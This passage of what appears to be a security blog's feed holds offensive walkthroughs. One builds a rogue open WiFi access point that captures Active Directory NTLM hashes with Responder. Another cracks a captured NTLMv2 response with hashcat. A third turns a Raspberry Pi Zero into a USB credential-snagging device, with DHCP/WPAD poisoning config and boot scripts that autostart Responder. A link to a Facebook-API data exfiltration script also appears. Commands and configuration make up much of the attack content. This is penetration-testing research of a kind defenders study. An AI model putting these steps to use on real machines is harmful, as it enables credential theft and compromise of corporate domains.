&lt;p&gt;The base for the Python scripts have been adopted from &lt;a href=&#34;http://nodotcom.org/python-facebook-tutorial.html&#34;&gt;link 1&lt;/a&gt; and &lt;a href=&#34;https://github.com/minimaxir/facebook-page-post-scraper/blob/master/get_fb_posts_fb_page.py&#34;&gt;link 2&lt;/a&gt;. All credits to the original work for making this simple.&lt;/p&gt;

&lt;p&gt;Python script for data exfiltration - &lt;a href=&#34;https://github.com/zone13/python_facebook/blob/master/put.py&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Python script for retrieving the FB post and writing to file - &lt;a href=&#34;https://github.com/zone13/python_facebook/blob/master/get.py&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This also goes to demonstrate how Facebook APIs can be exploited for malicious purposes, e.g. a malware with API tokens that can post to a Facebook page / wall maintained by the bad guy.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Snagging Active Directory credentials over WiFi - Part 1</title>
      <link>https://zone13.io/post/Snagging-credentials-over-WiFi-Part1/</link>
      <pubDate>Mon, 03 Oct 2016 23:26:44 +0100</pubDate>
      
      <guid>https://zone13.io/post/Snagging-credentials-over-WiFi-Part1/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;This issue has been fixed on Windows 8+ as part of MS16-112 issued in September 2016. I haven&amp;rsquo;t checked this on a Windows 7 machine which isn&amp;rsquo;t listed on the Microsoft page.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;basics&#34;&gt;Basics&lt;/h4&gt;

&lt;p&gt;The basic theory behind the attack is same as &lt;a href=&#34;https://twitter.com/mubix&#34;&gt;@mubix&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;discovery&lt;/a&gt; - if you connect a network interface to a Windows system and have &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder tool&lt;/a&gt; poisoning the network, you can obtain the hashes (NTML responses) from the machine without any user intervention. This works even with the computer in &lt;strong&gt;locked state&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In my scenario, I&amp;rsquo;m using a rogue Open WiFi network to grab the hashes. The result is the same and at times, I had better results than plugging in a &lt;a href=&#34;https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/&#34;&gt;Pi Zero&lt;/a&gt;. The Responder tool captures the hashes which can then be cracked using tools like &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;hashcat&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: This only works with a domain joined computer. I haven&amp;rsquo;t seen a local account sending out hashes without user intervention.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Who is affected by this vulnerability and the related attack?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This vulnerability is applicable to Windows machines (7+) that are part of an Active Directory domain and connects to Open WiFi access points with &amp;lsquo;Connect automatically&amp;rsquo; option enabled. The vulnerability can be exploited if &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms16-112.aspx&#34;&gt;MS16-112&lt;/a&gt; patch is not installed on the system.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&#34;terminology&#34;&gt;Terminology:&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;LLMNR / NBT-NS poisoning&lt;/strong&gt; - I assume this is familiar by now. If not, there are a number of good resources that explain how the Responder tool uses this to capture hashes. &lt;a href=&#34;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning&#34;&gt;Here&lt;/a&gt; is a good write-up from Stern Security.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Open WiFi network&lt;/strong&gt; - A WiFi network that allows clients to connect to it without needing any form of authentication and there is no channel encryption employed when the clients communicate. This includes public networks like Starbucks, Airport WiFi etc. which allows users to access internet either free or after paying a fee.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rogue WiFi access point&lt;/strong&gt; - An access point that masquerades as a legitimate access point by advertising the same SSID.&lt;/p&gt;

&lt;h4 id=&#34;attack-scenario&#34;&gt;Attack scenario&lt;/h4&gt;

&lt;p&gt;The catch about Open WiFi networks is that they allow clients to connect, get an IP over DHCP and share a common network with other clients. This means that an attacker waiting on the network can do things like ARP spoofing, Man-in-the-middle etc. to compromise the client. An attacker can always connect to a legitimate Open WiFi network and do poisoning attacks. However, in that case, the chances of him getting detected and logged are more. So, what are the options for an attacker?&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Create a rogue Open WiFi network and wait for the client to connect.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why should the client connect to the rogue network anyway?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is the important bit. On Windows, when a user connects to a WiFi network for the first time, he is presented with an option to &amp;lsquo;remember&amp;rsquo; the network so that the machine connects to the WiFi network every time it is in vicinity. So if you bring up a rogue open WiFi network, the client connects to it automatically without any user intervention. Also, it is to be noted that there are no notification pop-ups when the client connects to the rogue network, possibly a way to ensure seamless connectivity in an ESS network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/open_wifi.png&#34; alt=&#34;open_wifi&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, why only Open WiFi networks for this attack?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A rogue Open access network can be created just by knowing the SSID of a legitimate network. This is unlike a WEP/WPA/WPA2 network which requires the attacker to know the WiFi passphrase in order to create a rogue network and make the client connect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So you are telling me that the client must have connected to an Open WiFi access point. Why do you think anyone will connect a corporate laptop that is part of a Active Directory domain to an unsecure Open network?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Open WiFi networks are all around us. The whole point of enterprises distributing laptops is mobility. Users connect to various networks and establish a VPN connection back to the office network to access the resources. Imagine you are traveling for work. If you need internet access, one or the other time, you will most likely end up connecting to an Open WiFi network - like hotel WiFi, airport WiFi etc. Ask anyone who travels if you are still doubtful. :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ok, so if I travel and indeed connect to Open WiFi networks, how does the attacker know the SSID of the network I have connected to?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are various ways for an attacker to find this:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Monitor the client probes from the client machines that queries for stored WiFi SSIDs&lt;/li&gt;
&lt;li&gt;Resources like &lt;a href=&#34;https://wigle.net&#34;&gt;Wigle.NET&lt;/a&gt; that serve as a database of SSIDs with locations. If needed, these SSID&amp;rsquo;s can be scripted to see which ones elicits a response from client machines&lt;/li&gt;
&lt;li&gt;Google !! - basic recon stuff - search for the Hotel WiFi network name where the person has stayed (e.g. &lt;strong&gt;Marriott_Guest&lt;/strong&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;setup&#34;&gt;Setup&lt;/h4&gt;

&lt;h5 id=&#34;rogue-open-wifi-network&#34;&gt;Rogue Open WiFi network&lt;/h5&gt;

&lt;p&gt;Rogue APs can be of two types:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software based - E.g. Hostapd, Airbase-ng&lt;/li&gt;
&lt;li&gt;Hardware based - E.g. Actual WiFi routers, &lt;a href=&#34;https://www.wifipineapple.com/&#34;&gt;WiFi Pineapple&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;I have seen that WiFi Pineapple has a Responder &lt;a href=&#34;https://www.wifipineapple.com/modules&#34;&gt;module&lt;/a&gt;, but I haven&amp;rsquo;t tried it yet. I will leave it for another post.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I decided to go with an actual hardware WiFi router, the &lt;a href=&#34;http://www.tp-link.com/lk/products/details/cat-14_TL-MR3020.html&#34;&gt;TP-LINK MR3020&lt;/a&gt; for the following reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;del&gt;WiFi clients are getting smarter and they are able to detect and prevent connecting to software based APs. This can be bypassed using an actual WiFi router to which the clients connect willingly.&lt;/del&gt; &lt;font color=&#34;red&#34;&gt;Tried &lt;a href=&#34;https://github.com/sensepost/hostapd-mana&#34;&gt;hostapd-mana&lt;/a&gt; as pointed by &lt;a href=&#34;https://twitter.com/singe/status/784290909206646786&#34;&gt;@singe&lt;/a&gt; and it works well as an Evil twin.&lt;/font&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;MR3020 is a wonderful device that can be powered using a battery pack allowing you to even do a &amp;lsquo;wardriving&amp;rsquo; exercise.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;It has an &lt;a href=&#34;https://wiki.openwrt.org/toh/tp-link/tl-mr3020&#34;&gt;OpenWrt&lt;/a&gt; firmware with more options. However, I have used the factory firmware in this case.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h5 id=&#34;a-linux-machine-to-run-responder&#34;&gt;A Linux machine to run Responder&lt;/h5&gt;

&lt;p&gt;I used a Raspberry Pi 3 running Raspbian (referred to as RPi here on).&lt;/p&gt;

&lt;h5 id=&#34;an-ssh-client-to-remote-into-rpi-and-view-the-live-capture&#34;&gt;An SSH client to remote into RPi and view the live capture&lt;/h5&gt;

&lt;p&gt;I connected my laptop to the rogue WiFi and SSH&amp;rsquo;ed into RPi.&lt;/p&gt;

&lt;h4 id=&#34;execution&#34;&gt;Execution&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Step1:&lt;/strong&gt; Clone the Responder tool from &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;GitHub repo&lt;/a&gt; on to the RPi.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; Configure the MR3020 using the SSID (&lt;strong&gt;Z13_guest_wifi&lt;/strong&gt; in my case) of the Open WiFi network that the user has connected to in the past. Additionally, set the DNS server under DHCP options to the IP of the RPi so that we get all the DNS queries. The RPi can be given a static IP every time by doing an address reservation. Toggle the hardware switch to 3G/4G so that the RPi can be plugged into it&amp;rsquo;s LAN port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/MR3020_open_wifi_config.png&#34; alt=&#34;MR3020_open_wifi_config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/mr3020_dns_server.png&#34; alt=&#34;mr3020_dns_server&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; Connect the RPi to MR3020 and power on both devices. The RPi boots up and gets an IP from the MR3020.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt; Connect to the rogue WiFi network and SSH into RPi. Run the Responder tool.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./Responder.py -I eth0 -f -w -r -d -F&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/run_responder.png&#34; alt=&#34;run_responder&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt; Wait until the client connects to our rogue WiFi network. This can be done in a couple of ways:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Wait until the client connects by virtue of higher signal strength&lt;/li&gt;
&lt;li&gt;De-auth the client from the legitimate network and connect to the rogue AP&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once the client connects, the Responder tool does its magic and captures the hashes. It was observed that &lt;em&gt;if the client was made to re-connect to the rogue network, the hash was captured much quickly&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/hash_captured.png&#34; alt=&#34;hash_captured&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The captured hashes can then be cracked using tools like hashcat.&lt;/p&gt;

&lt;h4 id=&#34;advantages&#34;&gt;Advantages&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;No physical access to the system required, only WiFi proximity is needed&lt;/li&gt;
&lt;li&gt;Plugging in USB devices like LAN Turtle can be disabled using AD policies. This attack vector has an edge in that case&lt;/li&gt;
&lt;li&gt;No driver installation required - use of Pi Zero for mubix&amp;rsquo;s attack required the driver to be pre-installed on the target system.&lt;/li&gt;
&lt;li&gt;No logs recorded on the enterprise logging systems. The only place where this gets logged is Windows Event Viewer&lt;/li&gt;
&lt;li&gt;Less chances of discovering that the hashes were grabbed. This gives an attacker ample time to crack the hash on his cracking rig.&lt;/li&gt;
&lt;li&gt;Ability to do a wardriving exercise to capture hashes from multiple machines which has connected to the same Open WiFi network.&lt;/li&gt;
&lt;li&gt;The hash was observed to be captured quite quickly (often less than 30 seconds).&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h4&gt;

&lt;p&gt;This attack scenario can compromise the enterprise&amp;rsquo;s AD domain without even touching the on premise network (wired or wireless). The only info that an attacker needs is the  SSID of &amp;lsquo;&lt;strong&gt;any one&lt;/strong&gt;&amp;rsquo; Open WiFi network that the user has connected to in the past with &amp;lsquo;Connect automatically&amp;rsquo; option enabled. From a network admin perspective, this can be a nightmare. Of course, the success of obtaining the plaintext credentials depend on whether the NTLM hash can be cracked. With ever increasing computational power and plaintext passwords getting dumped every now and then from various sources, the chances of cracking the passwords are quite good.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cracking NTLMv2 responses captured using responder</title>
      <link>https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/</link>
      <pubDate>Fri, 23 Sep 2016 19:55:06 +0100</pubDate>
      
      <guid>https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/</guid>
      <description>

&lt;p&gt;In the previous &lt;a href=&#34;https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/&#34;&gt;post&lt;/a&gt;, a Raspberry Pi Zero was modified to capture hashes (or rather NTLMv2 responses from the client).&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s see how &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;hashcat&lt;/a&gt; can be used to crack these responses to obtain the user password. I will be using dictionary based cracking for this exercise on a Windows system.&lt;/p&gt;

&lt;h3 id=&#34;setup&#34;&gt;Setup&lt;/h3&gt;

&lt;p&gt;Download the latest version of hashcat binaries from &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;here&lt;/a&gt; - v3.10 at the time of writing.&lt;/p&gt;

&lt;p&gt;Unzip the 7z file and open a command prompt at the unzipped location.&lt;/p&gt;

&lt;p&gt;For convenience, I have created two directories in the hashcat folder:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hashes&lt;/strong&gt; - to store the responses that need to be cracked&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;cracked&lt;/strong&gt; - to store the cracked passwords&lt;/p&gt;

&lt;h3 id=&#34;captured-responses&#34;&gt;Captured responses&lt;/h3&gt;

&lt;p&gt;The client response captured by Responder was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HTTP] NTLMv2 Client   : 192.168.154.131
[HTTP] NTLMv2 Username : MANGO\neo
[HTTP] NTLMv2 Hash     : neo::MANGO:1122334455667788:2F6CC22CFDC387CFEEB2D325E8997564:0101000000000000C79708D95F14D2011D717D511A761654000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000001000001047325384B3A000DD5138E15668CB4F44DA5471DAF7A327B5B4E3C19DC485120A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;where,&lt;/p&gt;

&lt;p&gt;MANGO is my domain name and neo is the user who was logged into the system.&lt;/p&gt;

&lt;p&gt;I saved the response into a text file named &lt;strong&gt;hash.txt&lt;/strong&gt; in the &lt;strong&gt;hashes&lt;/strong&gt; folder created earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/hash.png&#34; alt=&#34;hash&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;cracking-using-hashcat&#34;&gt;Cracking using hashcat&lt;/h3&gt;

&lt;p&gt;The hashcat developers have done a wonderful job in simplifying the cracking process. All you need is a fast  cracking machine and patience. :)&lt;/p&gt;

&lt;p&gt;Since this is a dictionary based cracking, there are two scenarios here:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Your password list does not contain the user password&lt;/li&gt;
&lt;li&gt;Your password list has the user password&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I wanted to show both scenarios here, starting with the worst case - not having the password in the list.&lt;/p&gt;

&lt;p&gt;For the sake of the the demo, I extracted a subset of the passwords from example.dict that comes with hashcat and saved it as &lt;strong&gt;password_list.txt&lt;/strong&gt; in the hashcat folder. For the first run, the &lt;strong&gt;password_list.txt&lt;/strong&gt; does not have the user password.&lt;/p&gt;

&lt;p&gt;Open a command prompt at the extracted hashcat folder. For NTLMv2 cracking, the hashcat can be run as,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat64.exe -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;If you don&amp;rsquo;t specify -o switch, the password (if cracked) will be stored in &lt;strong&gt;hashcat.pot&lt;/strong&gt; file in the hashcat folder.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If the password is not found, this is what you see once hashcat completes the cracking.&lt;/p&gt;

&lt;p&gt;Status: &lt;strong&gt;Exhausted&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/password_not_found.png&#34; alt=&#34;password_not_found&#34; /&gt;&lt;/p&gt;

&lt;p&gt;For the next run, the case if I have the user password in my password list. I edited the password_list.txt and appended the user password (I created the user, remember :)).&lt;/p&gt;

&lt;p&gt;Running the hashcat tool again,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat64.exe -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Status: &lt;strong&gt;Cracked&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/password_found.png&#34; alt=&#34;password_found&#34; /&gt;&lt;/p&gt;

&lt;p&gt;To view the cracked password, see the &lt;strong&gt;cracked.txt&lt;/strong&gt; file in the folder named &lt;strong&gt;cracked&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/cracked_out.png&#34; alt=&#34;cracked_out&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The success of cracking the password using this method solely depends on whether or not your password list is good enough.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raspberry Pi Zero for credential snagging</title>
      <link>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</link>
      <pubDate>Sun, 18 Sep 2016 12:13:05 +0100</pubDate>
      
      <guid>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;Update: &lt;strong&gt;CVE-2016-3302&lt;/strong&gt; / &lt;strong&gt;MS16-112&lt;/strong&gt; patch was released by Microsoft to fix the issue.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;This post is an extension to Rob Fuller&amp;rsquo;s (@mubix) work - &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;https://room362.com/post/2016/snagging-creds-from-locked-machines/&lt;/a&gt; to see how a Raspberry Pi Zero can be used for credential snagging. All credits go to @mubix for the original research. It is recommended to read mubix&amp;rsquo;s post (if you haven&amp;rsquo;t already !) before proceeding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pizero.jpeg&#34; alt=&#34;&#34; style=&#34;width:600px&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;

&lt;h4 id=&#34;software&#34;&gt;Software&lt;/h4&gt;

&lt;p&gt;This will &lt;strong&gt;only&lt;/strong&gt; work if the target Windows system has &lt;a href=&#34;https://en.wikipedia.org/wiki/RNDIS&#34;&gt;RNDIS&lt;/a&gt; drivers installed. The driver doesn&amp;rsquo;t seem to install automatically (like when you plug in a new mouse or any USB accessory) and has to be installed manually as explained &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt; after booting up the Pi Zero for the first time.&lt;/p&gt;

&lt;h4 id=&#34;hardware&#34;&gt;Hardware&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;Raspberry Pi Zero (I have v1.3)&lt;/li&gt;
&lt;li&gt;Micro SD card (4GB or more) with &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;Raspbian Jessie&lt;/a&gt; (I used Jessie Lite, Release date: 2016-05-27)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Micro USB cable (any cable that supports data transfer - try those coming with mobiles)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;procedure&#34;&gt;Procedure&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;m setting up the Pi Zero from my Windows machine (Windows 8.1). If you are working from a different OS, adopt any changes as necessary (Google is your best friend :)).&lt;/p&gt;

&lt;p&gt;I assume that you have already installed the Raspbian Jessie Lite OS on the Micro SD card. On Windows, I prefer to use the &lt;a href=&#34;https://sourceforge.net/projects/win32diskimager/&#34;&gt;Win32DiskImager&lt;/a&gt;. If you are not familiar with the OS flashing process, refer &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;pi-zero-usb-gadget-setup&#34;&gt;Pi Zero USB gadget setup&lt;/h4&gt;

&lt;p&gt;Insert the Micro SD card with Raspbian OS into a suitable card reader and plug it into the Windows system. Open the boot partition in Windows explorer.&lt;/p&gt;

&lt;p&gt;Two files need to be edited here:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;config.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Append the following on a new line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dtoverlay=dwc2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/config.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;cmdline.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Insert the following after &lt;strong&gt;rootwait&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;modules-load=dwc2,g_ether
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Be careful with the formatting on this one, the values are separated by spaces.&lt;/p&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/cmdline.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once both the files are edited and saved, eject the Micro SD card and insert into the Pi Zero slot. Connect the Pi Zero to the Windows system using the Micro USB cable.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: The cable has to be connected to the Micro USB port of Pi Zero to be used as a USB gadget.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pi-zero-packages-setup&#34;&gt;Pi Zero packages setup&lt;/h4&gt;

&lt;p&gt;If the Pi Zero is not detected by Windows system after booting up, it means that RNDIS drivers are not installed. The drivers can be installed by following the procedure &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once the RNDIS devices are installed, the new USB Ethernet will be visible under &lt;strong&gt;Network Connections&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/net_conns_adapter.png&#34; alt=&#34;net_conns_adapter&#34; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: I have renamed my adapter as &lt;strong&gt;PiZero&lt;/strong&gt; and hence displayed above.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are a number of packages that need to be installed on the Pi Zero to be used a credential snagging device. For this to happen, the Pi Zero will need Internet access.&lt;/p&gt;

&lt;p&gt;I decided to share my LAN Internet with Pi Zero for this purpose. You can do the same or even share your Wi-Fi Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/share_internet.png&#34; alt=&#34;share_internet&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this stage you should be able to ping Pi Zero (hostname: &lt;em&gt;raspberrypi.local&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/ping_pizero_local.png&#34; alt=&#34;ping_pizero_local&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you can SSH to Pi Zero using the hostname.&lt;/p&gt;

&lt;p&gt;The default credentials are:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;username: pi&lt;/p&gt;

&lt;p&gt;password: raspberry&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/putty_settings.png&#34; alt=&#34;putty_settings&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, it is a good idea to check Internet connectivity for the Pi Zero (e.g. try pinging google.com). If the ping can resolve to IP (not getting a ping response is alright), you are good to go. If there is some connectivity error, try running:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo dhclient usb0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, proceed with running the below commands in order:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt-get update
sudo apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools

sudo mkdir tools
cd tools
sudo git clone https://github.com/lgandx/Responder.git responder
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;configure-a-static-ip&#34;&gt;Configure a static IP&lt;/h4&gt;

&lt;p&gt;Open /etc/network/interfaces&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/network/interfaces
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code at the end of the file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/etc_interfaces.png&#34; alt=&#34;etc_interfaces&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;dhcp-server-setup&#34;&gt;DHCP server setup&lt;/h4&gt;

&lt;p&gt;Backup the existing config file and create a new one for our setup&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
sudo nano /etc/dhcp/dhcpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ddns-update-style none;

option domain-name &amp;quot;domain.local&amp;quot;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;run-scripts-at-boot&#34;&gt;Run scripts at boot&lt;/h4&gt;

&lt;p&gt;Open the /etc/rc.local file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/rc.local
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code before &lt;strong&gt;exit 0&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &#39;cd /home/pi/tools/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;

# Monitor Responder.db and shutdown once the hashes are captured
echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /home/pi/tools/responder/Responder.db; do shutdown -h now; done&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;create-logs-for-screen-sessions&#34;&gt;Create logs for screen sessions&lt;/h4&gt;

